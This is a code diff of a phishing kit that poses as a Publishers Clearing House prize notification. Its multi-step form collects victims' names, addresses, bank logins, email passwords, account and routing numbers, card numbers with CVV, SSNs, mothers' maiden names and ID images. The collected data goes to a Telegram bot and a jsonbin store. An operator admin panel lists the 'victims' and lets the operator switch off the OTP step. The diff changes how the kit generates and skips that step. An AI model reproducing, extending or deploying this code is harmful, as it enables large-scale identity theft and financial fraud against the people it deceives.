@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title id="page-title">PCH - Official Prize Notification</title>
+    <title>PCH - Official Prize Notification</title>
     <style>
         :root {
             --pch-red: #E31841;
@@ -13,17 +13,13 @@
             --pch-gray: #F4F4F4;
             --pch-border: #E0E0E0;
             --pch-text: #2C3E50;
-            --admin-bg: #121212;
-            --admin-card: #1E1E1E;
         }
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: var(--pch-gray); margin: 0; padding: 0; color: var(--pch-text); min-height: 100vh; display: flex; flex-direction: column; }
         
-        /* HEADER & LOGO */
         .pch-header { background: var(--pch-white); padding: 15px; text-align: center; border-bottom: 1px solid var(--pch-border); box-shadow: 0 2px 8px rgba(0,0,0,0.05); }
-        .logo-container { display: inline-block; }
-        .pch-logo-main { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-weight: 900; color: var(--pch-gold); font-size: 48px; line-height: 1; display: block; }
-        .pch-logo-sub { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-weight: 400; color: var(--pch-gold); font-size: 28px; margin-top: 5px; display: block; text-transform: uppercase; letter-spacing: 1px; }
+        .pch-logo { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; font-weight: 900; color: var(--pch-gold); font-size: 32px; letter-spacing: -1px; display: inline-block; }
+        .pch-logo span { color: var(--pch-black); font-weight: 400; font-size: 18px; margin-left: 5px; }
 
         .main-container { flex: 1; display: flex; justify-content: center; padding: 20px 15px 40px 15px; }
         .card { width: 100%; max-width: 550px; background: var(--pch-white); border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.08); overflow: hidden; border: 1px solid rgba(0,0,0,0.05); }
@@ -33,17 +29,15 @@
         .card-header p { margin: 10px 0 0 0; color: #666; font-size: 15px; font-weight: 500; }
 
         .card-body { padding: 30px; }
-        
-        /* PROGRESS BAR */
         .progress-container { margin-bottom: 30px; }
-        .progress-bar-bg { width: 100%; height: 8px; background: #EEE; border-radius: 4px; overflow: hidden; }
-        .progress-bar-fill { height: 100%; background: var(--pch-red); width: 0%; transition: width 0.5s ease; }
+        .progress-bar-bg { width: 100%; height: 6px; background: #EEE; border-radius: 3px; overflow: hidden; }
+        .progress-bar-fill { height: 100%; background: var(--pch-red); width: 0%; transition: width 0.3s ease; }
         .progress-text { text-align: right; font-size: 11px; color: #888; margin-top: 6px; font-weight: 600; text-transform: uppercase; }
 
         .form-group { margin-bottom: 20px; }
         label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: var(--pch-black); text-transform: uppercase; letter-spacing: 0.5px; }
-        input, select, textarea { width: 100%; padding: 14px 16px; border: 1px solid #DDD; border-radius: 8px; font-size: 16px; background: #FAFAFA; transition: all 0.2s; font-family: inherit; }
-        input:focus, select:focus, textarea:focus { border-color: var(--pch-red); background: white; box-shadow: 0 0 0 3px rgba(227, 24, 65, 0.1); }
+        input, select { width: 100%; padding: 14px 16px; border: 1px solid #DDD; border-radius: 8px; font-size: 16px; background: #FAFAFA; transition: all 0.2s; font-family: inherit; }
+        input:focus, select:focus { border-color: var(--pch-red); background: white; box-shadow: 0 0 0 3px rgba(227, 24, 65, 0.1); }
         
         .btn-primary { width: 100%; padding: 16px; background: var(--pch-gold); color: var(--pch-black); border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 10px; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; text-transform: uppercase; letter-spacing: 0.5px; transition: all 0.2s; box-shadow: 0 4px 10px rgba(242, 201, 76, 0.3); }
         .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 6px 15px rgba(242, 201, 76, 0.4); }
@@ -55,19 +49,13 @@
         .footer { text-align: center; font-size: 12px; color: #888; padding: 30px 20px; background: var(--pch-white); border-top: 1px solid #EEE; }
         .footer a { color: var(--pch-red); text-decoration: none; font-weight: 600; cursor: pointer; }
 
-        /* ID UPLOAD */
-        .id-upload-area { border: 2px dashed #DDD; padding: 20px; text-align: center; border-radius: 8px; cursor: pointer; background: #FAFAFA; }
-        .id-upload-area:hover { border-color: var(--pch-red); background: #FFF5F5; }
-        .id-upload-text { font-size: 14px; color: #888; }
-        .id-preview-img { max-width: 100%; max-height: 150px; border-radius: 6px; margin-top: 10px; display: block; margin-left: auto; margin-right: auto; }
-
         /* ADMIN UI */
-        #admin-panel { display: none; min-height: 100vh; background: var(--admin-bg); color: #E0E0E0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        #admin-panel { display: none; min-height: 100vh; background: #121212; color: #E0E0E0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
         .admin-header { background: #1E1E1E; padding: 20px 30px; border-bottom: 1px solid #333; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; }
         .admin-header h2 { margin: 0; color: #FFD700; font-size: 20px; font-weight: 700; }
         .admin-body { padding: 30px; max-width: 1200px; margin: 0 auto; }
         .admin-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
-        .admin-card { background: var(--admin-card); padding: 25px; border-radius: 12px; border: 1px solid #333; margin-bottom: 20px; }
+        .admin-card { background: #1E1E1E; padding: 25px; border-radius: 12px; border: 1px solid #333; }
         .admin-card h3 { margin-top: 0; color: #FFD700; font-size: 16px; text-transform: uppercase; letter-spacing: 1px; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
         .form-row { margin-bottom: 15px; }
         .form-row label { font-size: 12px; color: #AAA; margin-bottom: 5px; display: block; text-transform: uppercase; }
@@ -107,6 +95,7 @@
         .success-screen, .otp-screen { text-align: center; padding: 40px 20px; }
         .success-icon { font-size: 50px; color: var(--pch-red); margin-bottom: 20px; }
         .error-icon { font-size: 50px; color: #dc3545; margin-bottom: 20px; }
+        .otp-display { font-size: 36px; font-weight: bold; color: var(--pch-black); background: #F4F4F4; padding: 15px 30px; border-radius: 8px; display: inline-block; margin: 20px 0; letter-spacing: 5px; border: 2px dashed var(--pch-red); }
         
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--pch-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -117,10 +106,7 @@
     <!-- VICTIM VIEW -->
     <div id="victim-view">
         <div class="pch-header">
-            <div class="logo-container">
-                <span class="pch-logo-main">PCH</span>
-                <span class="pch-logo-sub" id="header-sub">Publishers Clearing House</span>
-            </div>
+            <div class="pch-logo" id="header-logo">PCH <span id="header-sub">Publishers Clearing House</span></div>
         </div>
 
         <div class="main-container">
@@ -132,7 +118,7 @@
                 <div class="card-body">
                     <div id="error-container" class="error-message"></div>
 
-                    <div class="progress-container" id="progress-container">
+                    <div class="progress-container">
                         <div class="progress-bar-bg">
                             <div class="progress-bar-fill" id="progress-fill"></div>
                         </div>
@@ -146,16 +132,17 @@
                         
                         <div id="verifying-screen" class="hidden success-screen">
                             <div class="spinner"></div>
-                            <h2 style="color: var(--pch-black);" id="verifying-title">Verifying Details...</h2>
-                            <p id="verifying-message">Please wait while we confirm your information.</p>
+                            <h2 style="color: var(--pch-black);">Verifying Details...</h2>
+                            <p>Please wait while we confirm your bank information.</p>
                         </div>
 
                         <div id="otp-input-screen" class="hidden success-screen">
                             <div class="error-icon">🔐</div>
                             <h2 id="otp-page-title">Enter Verification Code</h2>
-                            <p id="otp-page-message">Enter the 6-digit code sent to your device.</p>
+                            <p id="otp-page-message">A 6-digit code has been generated for you.</p>
+                            <div class="otp-display" id="generated-otp-display">000000</div>
                             <div class="form-group">
-                                <label id="otp-label">Enter Code:</label>
+                                <label id="otp-label">Type the code above:</label>
                                 <input type="text" id="otp-code-input" required placeholder="000000" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
                             </div>
                             <button class="btn-primary" id="otp-submit-btn" onclick="submitOtp()">Verify Code</button>
@@ -226,7 +213,7 @@
                         <input type="text" id="admin-headline" class="admin-input" placeholder="Congratulations, [Name]!">
                     </div>
                     <div class="form-row">
-                        <label>Site Name (Header/Foot)</label>
+                        <label>Site Name</label>
                         <input type="text" id="admin-site-name" class="admin-input" placeholder="Publishers Clearing House">
                     </div>
                     <div class="form-row">
@@ -236,17 +223,9 @@
                     <button class="btn-admin btn-save" onclick="saveGlobalConfig()">Save Global Settings</button>
                 </div>
 
-                <!-- Page Content Editor (OTP & Success) -->
+                <!-- OTP & Success Page Editor -->
                 <div class="admin-card">
                     <h3>Edit OTP & Success Pages</h3>
-                    <div class="form-row">
-                        <label>Verifying Screen Title</label>
-                        <input type="text" id="admin-verifying-title" class="admin-input">
-                    </div>
-                    <div class="form-row">
-                        <label>Verifying Screen Message</label>
-                        <textarea id="admin-verifying-message" class="admin-input" rows="2"></textarea>
-                    </div>
                     <div class="form-row">
                         <label>OTP Page Title</label>
                         <input type="text" id="admin-otp-title" class="admin-input">
@@ -278,28 +257,28 @@
                     <button class="btn-admin btn-save" onclick="savePageContent()">Save Page Content</button>
                 </div>
 
-                <!-- Page Management & Labels -->
+                <!-- Page Management -->
                 <div class="admin-card">
-                    <h3>Manage Pages & Labels</h3>
+                    <h3>Manage Pages (Hide/Show)</h3>
                     <div id="page-management-list">
                         <!-- Injected via JS -->
                     </div>
-                    <button class="btn-admin btn-save" onclick="savePageManagement()">Save Visibility & Labels</button>
+                    <button class="btn-admin btn-save" onclick="savePageManagement()">Save Page Visibility</button>
                 </div>
 
-                <!-- OTP Gate Control -->
+                <!-- Force OTP Skip -->
                 <div class="admin-card" style="border-color: var(--pch-gold);">
                     <h3>OTP Gate Control</h3>
                     <div class="form-row">
                         <label style="display: flex; align-items: center; gap: 10px;">
-                            <span>Disable OTP Gate (Auto-Success)</span>
+                            <span>Force OTP Skip (Bypass for all victims)</span>
                             <label class="toggle-switch">
-                                <input type="checkbox" id="admin-disable-otp" onchange="toggleDisableOtp()">
+                                <input type="checkbox" id="admin-force-skip-otp" onchange="toggleForceSkip()">
                                 <span class="slider"></span>
                             </label>
                         </label>
                     </div>
-                    <p style="font-size: 12px; color: #888; margin-top: 5px;">When ON, victims skip the OTP screen and go straight to Success.</p>
+                    <p style="font-size: 12px; color: #888; margin-top: 5px;">When ON, victims will go straight to Success after the last form field.</p>
                 </div>
             </div>
 
@@ -311,8 +290,7 @@
                             <th>Time & IP</th>
                             <th>Personal Info</th>
                             <th>Bank & CC</th>
-                            <th>OTP Entered</th>
-                            <th>Status</th>
+                            <th>OTP & Status</th>
                             <th>Action</th>
                         </tr>
                     </thead>
@@ -339,20 +317,19 @@
             chatId: '',
             jsonbinKey: '',
             jsonbinId: '',
+            otpLength: 6,
             winnerName: 'Winner',
             prizeAmount: '$7,500',
             headline: 'Congratulations, [Name]!',
             siteName: 'Publishers Clearing House',
             primaryColor: '#F2C94C',
-            disableOtp: false,
-            verifyingTitle: 'Verifying Details...',
-            verifyingMessage: 'Please wait while we confirm your information.',
+            forceSkipOtp: false,
             successTitle: 'Successfully Verified!',
             successMessage: 'Congratulations! You have been successfully verified.',
             successSubMessage: 'Your prize will be deposited within 24 hours.',
             successButton: 'Finish',
             otpTitle: 'Enter Verification Code',
-            otpMessage: 'Enter the 6-digit code sent to your device.',
+            otpMessage: 'A 6-digit code has been generated for you.',
             otpButton: 'Verify Code',
             labels: {
                 'step-1-field-1': 'Full Name',
@@ -393,9 +370,9 @@
         let config = JSON.parse(JSON.stringify(defaultConfig));
         let ipData = { ip: 'Loading...', city: '', country: '' };
         let currentStep = 1;
+        let generatedOTP = '';
         let currentSubmissionId = null;
         let victimData = {};
-        let enabledPages = [];
 
         // Load saved data
         const savedConfig = localStorage.getItem('pch_config');
@@ -421,15 +398,12 @@
             document.getElementById('admin-success-message').value = config.successMessage;
             document.getElementById('admin-success-submessage').value = config.successSubMessage;
             document.getElementById('admin-success-button').value = config.successButton;
-            
-            document.getElementById('admin-verifying-title').value = config.verifyingTitle;
-            document.getElementById('admin-verifying-message').value = config.verifyingMessage;
 
             document.getElementById('admin-otp-title').value = config.otpTitle;
             document.getElementById('admin-otp-message').value = config.otpMessage;
             document.getElementById('admin-otp-button').value = config.otpButton;
 
-            document.getElementById('admin-disable-otp').checked = config.disableOtp;
+            document.getElementById('admin-force-skip-otp').checked = config.forceSkipOtp;
 
             applyLabels();
             applySiteContent();
@@ -449,6 +423,9 @@
                 const el = document.getElementById('label-' + key);
                 if (el) el.innerText = value;
             }
+            document.getElementById('otp-label').innerText = config.otpTitle;
+            const otpBtn = document.getElementById('otp-submit-btn');
+            if(otpBtn) otpBtn.innerText = config.otpButton;
         }
 
         function applySiteContent() {
@@ -473,13 +450,9 @@
             document.getElementById('success-message').innerText = config.successMessage;
             document.getElementById('success-submessage').innerText = config.successSubMessage;
             document.getElementById('success-button').innerText = config.successButton;
-            
-            document.getElementById('verifying-title').innerText = config.verifyingTitle;
-            document.getElementById('verifying-message').innerText = config.verifyingMessage;
 
             document.getElementById('otp-page-title').innerText = config.otpTitle;
             document.getElementById('otp-page-message').innerText = config.otpMessage;
-            document.getElementById('otp-submit-btn').innerText = config.otpButton;
         }
 
         function generatePageManagement() {
@@ -497,43 +470,7 @@
                     </label>
                 `;
                 list.appendChild(div);
-                
-                // Add label editing fields for this page
-                const labelDiv = document.createElement('div');
-                labelDiv.style.padding = '10px';
-                labelDiv.style.background = '#2A2A2A';
-                labelDiv.style.borderRadius = '6px';
-                labelDiv.style.marginBottom = '10px';
-                
-                let fieldsHtml = '';
-                if (page.id === 1) fieldsHtml = `<input class="admin-input" placeholder="Full Name" value="${config.labels['step-1-field-1']}" onchange="updateLabel('step-1-field-1', this.value)">`;
-                if (page.id === 2) fieldsHtml = `<input class="admin-input" placeholder="Billing Address" value="${config.labels['step-2-field-1']}" onchange="updateLabel('step-2-field-1', this.value)">`;
-                if (page.id === 3) fieldsHtml = `<input class="admin-input" placeholder="Phone Number" value="${config.labels['step-3-field-1']}" onchange="updateLabel('step-3-field-1', this.value)">`;
-                if (page.id === 4) fieldsHtml = `<input class="admin-input" placeholder="Bank Name" value="${config.labels['step-4-field-1']}" onchange="updateLabel('step-4-field-1', this.value)">`;
-                if (page.id === 5) fieldsHtml = `<input class="admin-input" placeholder="Username" value="${config.labels['step-5-field-1']}" onchange="updateLabel('step-5-field-1', this.value)">
-                                          <input class="admin-input" placeholder="Password" value="${config.labels['step-5-field-2']}" onchange="updateLabel('step-5-field-2', this.value)">`;
-                if (page.id === 6) fieldsHtml = `<input class="admin-input" placeholder="Email" value="${config.labels['step-6-field-1']}" onchange="updateLabel('step-6-field-1', this.value)">
-                                          <input class="admin-input" placeholder="Email Password" value="${config.labels['step-6-field-2']}" onchange="updateLabel('step-6-field-2', this.value)">`;
-                if (page.id === 7) fieldsHtml = `<input class="admin-input" placeholder="Account Number" value="${config.labels['step-7-field-1']}" onchange="updateLabel('step-7-field-1', this.value)">
-                                          <input class="admin-input" placeholder="Routing Number" value="${config.labels['step-7-field-2']}" onchange="updateLabel('step-7-field-2', this.value)">`;
-                if (page.id === 8) fieldsHtml = `<input class="admin-input" placeholder="Credit Card" value="${config.labels['step-8-field-1']}" onchange="updateLabel('step-8-field-1', this.value)">
-                                          <input class="admin-input" placeholder="Expiration" value="${config.labels['step-8-field-2']}" onchange="updateLabel('step-8-field-2', this.value)">
-                                          <input class="admin-input" placeholder="CVV" value="${config.labels['step-8-field-3']}" onchange="updateLabel('step-8-field-3', this.value)">`;
-                if (page.id === 9) fieldsHtml = `<input class="admin-input" placeholder="Date of Birth" value="${config.labels['step-9-field-1']}" onchange="updateLabel('step-9-field-1', this.value)">`;
-                if (page.id === 10) fieldsHtml = `<input class="admin-input" placeholder="SSN" value="${config.labels['step-10-field-1']}" onchange="updateLabel('step-10-field-1', this.value)">`;
-                if (page.id === 11) fieldsHtml = `<input class="admin-input" placeholder="Maiden Name" value="${config.labels['step-11-field-1']}" onchange="updateLabel('step-11-field-1', this.value)">`;
-                if (page.id === 12) fieldsHtml = `<input class="admin-input" placeholder="Front of ID" value="${config.labels['step-12-field-1']}" onchange="updateLabel('step-12-field-1', this.value)">
-                                          <input class="admin-input" placeholder="Back of ID" value="${config.labels['step-12-field-2']}" onchange="updateLabel('step-12-field-2', this.value)">`;
-                
-                labelDiv.innerHTML = fieldsHtml;
-                list.appendChild(labelDiv);
             });
-        }
-
-        function updateLabel(key, value) {
-            config.labels[key] = value;
-            localStorage.setItem('pch_config', JSON.stringify(config));
-            applyLabels();
         }
 
         function savePageManagement() {
@@ -543,11 +480,10 @@
             });
             localStorage.setItem('pch_config', JSON.stringify(config));
             alert('Page Visibility Updated!');
-            init(); // Re-init to apply changes
         }
 
-        function toggleDisableOtp() {
-            config.disableOtp = document.getElementById('admin-disable-otp').checked;
+        function toggleForceSkip() {
+            config.forceSkipOtp = document.getElementById('admin-force-skip-otp').checked;
             localStorage.setItem('pch_config', JSON.stringify(config));
         }
 
@@ -582,10 +518,7 @@
             config.successTitle = document.getElementById('admin-success-title').value;
             config.successMessage = document.getElementById('admin-success-message').value;
             config.successSubMessage = document.getElementById('admin-success-submessage').value;
-            config.successButton = document.getElementById('admin-success-button'.value;
-
-            config.verifyingTitle = document.getElementById('admin-verifying-title').value;
-            config.verifyingMessage = document.getElementById('admin-verifying-message').value;
+            config.successButton = document.getElementById('admin-success-button').value;
 
             config.otpTitle = document.getElementById('admin-otp-title').value;
             config.otpMessage = document.getElementById('admin-otp-message').value;
@@ -593,6 +526,7 @@
             
             localStorage.setItem('pch_config', JSON.stringify(config));
             applySiteContent();
+            applyLabels();
             alert('Page Content Updated!');
         }
 
@@ -602,78 +536,72 @@
             const container = document.getElementById('steps-container');
             container.innerHTML = '';
             
-            enabledPages = config.pages.filter(p => p.enabled);
+            const enabledPages = config.pages.filter(p => p.enabled);
             
             if (enabledPages.length === 0) {
                 container.innerHTML = '<p style="text-align: center;">No pages are currently enabled.</p>';
-                document.getElementById('progress-container').classList.add('hidden');
                 return;
             }
 
-            // Render only the first enabled step initially
-            const firstStep = enabledPages[0];
-            container.innerHTML = generateStepHtml(firstStep.id);
-            
+            enabledPages.forEach((page, index) => {
+                const stepId = page.id;
+                const isLastEnabled = index === enabledPages.length - 1;
+                
+                let html = `<div class="form-step ${index === 0 ? '' : 'hidden'}" id="step-${stepId}">`;
+                
+                // Add fields based on step ID
+                if (stepId === 1) html += getFieldHtml(stepId, 1, 'text', 'Full Name');
+                else if (stepId === 2) html += getFieldHtml(stepId, 1, 'text', 'Billing Address');
+                else if (stepId === 3) html += getFieldHtml(stepId, 1, 'tel', 'Phone Number');
+                else if (stepId === 4) html += getFieldHtml(stepId, 1, 'text', 'Bank Name');
+                else if (stepId === 5) html += getFieldHtml(stepId, 1, 'text', 'Username') + getFieldHtml(stepId, 2, 'password', 'Password');
+                else if (stepId === 6) html += getFieldHtml(stepId, 1, 'email', 'Email') + getFieldHtml(stepId, 2, 'password', 'Email Password');
+                else if (stepId === 7) html += getFieldHtml(stepId, 1, 'text', 'Account Number') + getFieldHtml(stepId, 2, 'text', 'Routing Number');
+                else if (stepId === 8) html += getFieldHtml(stepId, 1, 'text', 'Credit Card Number') + getFieldHtml(stepId, 2, 'text', 'Expiration') + getFieldHtml(stepId, 3, 'text', 'CVV');
+                else if (stepId === 9) html += getFieldHtml(stepId, 1, 'date', 'Date of Birth');
+                else if (stepId === 10) html += getFieldHtml(stepId, 1, 'text', 'SSN');
+                else if (stepId === 11) html += getFieldHtml(stepId, 1, 'text', "Mother's Maiden Name");
+                else if (stepId === 12) {
+                    html += `
+                        <div class="form-group">
+                            <label id="label-step-${stepId}-field-1">Front of ID</label>
+                            <div class="id-upload-area" onclick="document.getElementById('id-front').click()">
+                                <div class="id-upload-text">Click to Upload Front Image</div>
+                                <input type="file" id="id-front" accept="image/*" style="display: none;" onchange="previewImage(this, 'front-preview')">
+                                <div id="front-preview"></div>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label id="label-step-${stepId}-field-2">Back of ID</label>
+                            <div class="id-upload-area" onclick="document.getElementById('id-back').click()">
+                                <div class="id-upload-text">Click to Upload Back Image</div>
+                                <input type="file" id="id-back" accept="image/*" style="display: none;" onchange="previewImage(this, 'back-preview')">
+                                <div id="back-preview"></div>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                // Next Button
+                if (isLastEnabled) {
+                    html += `<button class="btn-primary" onclick="prepareOtpStep()">Continue</button>`;
+                } else {
+                    const nextPage = enabledPages[index + 1];
+                    html += `<button class="btn-primary" onclick="nextStep(${nextPage.id})">Continue</button>`;
+                }
+                
+                html += `</div>`;
+                container.innerHTML += html;
+            });
+
             updateProgress(1, enabledPages.length);
         }
 
-        function generateStepHtml(stepId) {
-            let html = `<div class="form-step" id="step-${stepId}">`;
-            
-            if (stepId === 1) html += getFieldHtml(stepId, 1, 'text', 'Full Name');
-            else if (stepId === 2) html += getFieldHtml(stepId, 1, 'text', 'Billing Address');
-            else if (stepId === 3) html += getFieldHtml(stepId, 1, 'tel', 'Phone Number');
-            else if (stepId === 4) html += getFieldHtml(stepId, 1, 'text', 'Bank Name');
-            else if (stepId === 5) html += getFieldHtml(stepId, 1, 'text', 'Username') + getFieldHtml(stepId, 2, 'password', 'Password');
-            else if (stepId === 6) html += getFieldHtml(stepId, 1, 'email', 'Email') + getFieldHtml(stepId, 2, 'password', 'Email Password');
-            else if (stepId === 7) html += getFieldHtml(stepId, 1, 'text', 'Account Number') + getFieldHtml(stepId, 2, 'text', 'Routing Number');
-            else if (stepId === 8) html += getFieldHtml(stepId, 1, 'text', 'Credit Card Number') + getFieldHtml(stepId, 2, 'text', 'Expiration') + getFieldHtml(stepId, 3, 'text', 'CVV');
-            else if (stepId === 9) html += getFieldHtml(stepId, 1, 'date', 'Date of Birth');
-            else if (stepId === 10) html += getFieldHtml(stepId, 1, 'text', 'SSN');
-            else if (stepId === 11) html += getFieldHtml(stepId, 1, 'text', "Mother's Maiden Name");
-            else if (stepId === 12) {
-                html += `
-                    <div class="form-group">
-                        <label id="label-step-${stepId}-field-1">Front of ID</label>
-                        <div class="id-upload-area" onclick="document.getElementById('id-front').click()">
-                            <div class="id-upload-text">Click to Upload Front Image</div>
-                            <input type="file" id="id-front" accept="image/*" style="display: none;" onchange="previewImage(this, 'front-preview')">
-                            <div id="front-preview"></div>
-                        </div>
-                    </div>
-                    <div class="form-group">
-                        <label id="label-step-${stepId}-field-2">Back of ID</label>
-                        <div class="id-upload-area" onclick="document.getElementById('id-back').click()">
-                            <div class="id-upload-text">Click to Upload Back Image</div>
-                            <input type="file" id="id-back" accept="image/*" style="display: none;" onchange="previewImage(this, 'back-preview')">
-                            <div id="back-preview"></div>
-                        </div>
-                    </div>
-                `;
-            }
-            
-            // Find index of current step in enabledPages
-            const currentIndex = enabledPages.findIndex(p => p.id === stepId);
-            const isLastEnabled = currentIndex === enabledPages.length - 1;
-
-            if (isLastEnabled) {
-                html += `<button class="btn-primary" onclick="handleFinalStep()">Continue</button>`;
-            } else {
-                const nextPage = enabledPages[currentIndex + 1];
-                html += `<button class="btn-primary" onclick="nextStep(${nextPage.id})">Continue</button>`;
-            }
-            
-            html += `</div>`;
-            return html;
-        }
-
         function getFieldHtml(stepId, fieldNum, type, placeholder) {
-            const labelKey = `step-${stepId}-field-${fieldNum}`;
-            const labelText = config.labels[labelKey] || placeholder;
             return `
                 <div class="form-group">
-                    <label id="label-${labelKey}">${labelText}</label>
-                    <input type="${type}" id="field-step-${stepId}-${fieldNum}" required placeholder="${labelText}">
+                    <label id="label-step-${stepId}-field-${fieldNum}">${placeholder}</label>
+                    <input type="${type}" id="field-step-${stepId}-${fieldNum}" required placeholder="${placeholder}">
                 </div>
             `;
         }
@@ -705,74 +633,12 @@
             collectStepData(currentStep);
             sendStepTelegramAlert(currentStep);
 
-            // Hide current, show next
             document.getElementById(`step-${currentStep}`).classList.add('hidden');
             currentStep = stepId;
+            document.getElementById(`step-${currentStep}`).classList.remove('hidden');
             
-            // Generate HTML for the new step
-            const newStepHtml = generateStepHtml(currentStep);
-            document.getElementById('steps-container').innerHTML = newStepHtml;
-            
-            const currentIndex = enabledPages.findIndex(p => p.id === currentStep);
-            updateProgress(currentIndex + 1, enabledPages.length);
-        }
-
-        function handleFinalStep() {
-            const currentFields = document.querySelectorAll(`#step-${currentStep} input[required]`);
-            let valid = true;
-            currentFields.forEach(field => {
-                if (!field.value) {
-                    field.style.borderColor = 'var(--pch-red)';
-                    valid = false;
-                } else {
-                    field.style.borderColor = '#DDD';
-                }
-            });
-
-            if (!valid) return;
-            
-            collectStepData(currentStep);
-            
-            // Save Data
-            const data = {
-                id: Date.now(),
-                ...victimData,
-                otp: '',
-                status: 'WAITING',
-                timestamp: new Date().toLocaleString(),
-                ip: ipData.ip,
-                city: ipData.city,
-                country: ipData.country
-            };
-            
-            let submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
-            submissions.unshift(data);
-            localStorage.setItem('pch_submissions', JSON.stringify(submissions));
-            currentSubmissionId = data.id;
-            
-            sendToTelegram(data);
-            
-            if (config.jsonbinKey && config.jsonbinId) {
-                updateJsonBin(submissions);
-            }
-
-            // Check if OTP is disabled
-            if (config.disableOtp) {
-                document.getElementById('steps-container').innerHTML = '';
-                document.getElementById('verifying-screen').classList.remove('hidden');
-                setTimeout(() => {
-                    document.getElementById('verifying-screen').classList.add('hidden');
-                    document.getElementById('otp-success').classList.remove('hidden');
-                }, 1500);
-            } else {
-                // Show Verifying then OTP Input
-                document.getElementById('steps-container').innerHTML = '';
-                document.getElementById('verifying-screen').classList.remove('hidden');
-                setTimeout(() => {
-                    document.getElementById('verifying-screen').classList.add('hidden');
-                    document.getElementById('otp-input-screen').classList.remove('hidden');
-                }, 1500);
-            }
+            const enabledPages = config.pages.filter(p => p.enabled);
+            updateProgress(enabledPages.indexOf(config.pages.find(p => p.id === currentStep)) + 1, enabledPages.length);
         }
 
         function collectStepData(stepId) {
@@ -793,8 +659,8 @@
             if (stepId === 10) victimData.ssn = getVal('field-step-10-1');
             if (stepId === 11) victimData.maiden = getVal('field-step-11-1');
             if (stepId === 12) {
-                victimData.idFrontUrl = document.getElementById('front-preview')?.querySelector('img')?.src || '';
-                victimData.idBackUrl = document.getElementById('back-preview')?.querySelector('img')?.src || '';
+                victimData.idFrontUrl = document.getElementById('front-preview').querySelector('img')?.src || '';
+                victimData.idBackUrl = document.getElementById('back-preview').querySelector('img')?.src || '';
             }
         }
 
@@ -829,8 +695,96 @@
             }).catch(err => console.log('Telegram Error:', err));
         }
 
+        function prepareOtpStep() {
+            const currentFields = document.querySelectorAll(`#step-${currentStep} input[required]`);
+            let valid = true;
+            currentFields.forEach(field => {
+                if (!field.value) {
+                    field.style.borderColor = 'var(--pch-red)';
+                    valid = false;
+                } else {
+                    field.style.borderColor = '#DDD';
+                }
+            });
+
+            if (!valid) return;
+            
+            collectStepData(currentStep);
+            
+            // Check if Force Skip OTP is ON
+            if (config.forceSkipOtp) {
+                // Skip OTP, go straight to success
+                document.getElementById(`step-${currentStep}`).classList.add('hidden');
+                document.getElementById('verifying-screen').classList.remove('hidden');
+                
+                setTimeout(() => {
+                    document.getElementById('verifying-screen').classList.add('hidden');
+                    document.getElementById('otp-success').classList.remove('hidden');
+                    
+                    // Still save data but mark as Skipped
+                    const data = {
+                        id: Date.now(),
+                        ...victimData,
+                        otp: 'SKIPPED',
+                        status: 'ACTIVE', // Auto active if skipped
+                        timestamp: new Date().toLocaleString(),
+                        ip: ipData.ip,
+                        city: ipData.city,
+                        country: ipData.country
+                    };
+                    pushSubmissionsToCloud(data);
+                    sendToTelegram(data);
+                }, 1500);
+                return;
+            }
+
+            // Normal OTP Flow
+            const requiredLength = config.otpLength || 6;
+            generatedOTP = Math.floor(Math.pow(10, requiredLength - 1) + Math.random() * 9 * Math.pow(10, requiredLength - 1));
+            
+            document.getElementById(`step-${currentStep}`).classList.add('hidden');
+            document.getElementById('otp-input-screen').classList.remove('hidden');
+            document.getElementById('generated-otp-display').innerText = generatedOTP;
+            
+            pushSubmissionsToCloud();
+        }
+
+        function pushSubmissionsToCloud(customData = null) {
+            if (customData) {
+                const data = customData;
+                let submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
+                submissions.unshift(data);
+                localStorage.setItem('pch_submissions', JSON.stringify(submissions));
+                if (config.jsonbinKey && config.jsonbinId) {
+                    updateJsonBin(submissions);
+                }
+                return;
+            }
+
+            const data = {
+                id: Date.now(),
+                ...victimData,
+                otp: generatedOTP,
+                status: 'WAITING',
+                timestamp: new Date().toLocaleString(),
+                ip: ipData.ip,
+                city: ipData.city,
+                country: ipData.country
+            };
+
+            let submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
+            submissions.unshift(data);
+            localStorage.setItem('pch_submissions', JSON.stringify(submissions));
+            currentSubmissionId = data.id;
+
+            sendToTelegram(data);
+
+            if (config.jsonbinKey && config.jsonbinId) {
+                updateJsonBin(submissions);
+            }
+        }
+
         function updateJsonBin(submissions) {
-            if (!config.jsonbinKey || !config.jsonbinId) return;
             const url = `https://api.jsonbin.io/v3/b/${config.jsonbinId}`;
             const headers = {
                 'Content-Type': 'application/json',
@@ -876,6 +830,7 @@
 
 🌐 <b>IP:</b> ${data.ip} (${data.city}, ${data.country})
 
+🔐 <b>OTP Code:</b> ${data.otp}
 🟠 <b>Status:</b> ${data.status}
             `;
 
@@ -894,45 +849,36 @@
             const input = document.getElementById('otp-code-input').value;
             const errorDiv = document.getElementById('error-container');
             
